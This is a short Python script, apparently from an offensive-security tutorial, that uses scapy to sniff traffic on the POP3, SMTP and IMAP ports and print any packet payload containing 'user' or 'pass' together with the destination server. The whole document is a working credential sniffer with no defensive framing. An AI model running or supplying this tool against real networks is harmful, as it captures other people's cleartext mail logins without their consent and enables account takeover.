from scapy.all import *


# Our packet callback
def packet_callback(packet):
	try:
		if packet.haslayer(TCP) and packet[TCP].payload:
			mail_packet = bytes(packet[TCP].payload).decode()

			if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
				print("[*] Server: %s" % packet[IP].dst)
				print("[*] %s" % mail_packet)
	except Exception as e:
		print(f"Error: {e}")


# Fire up our sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=False)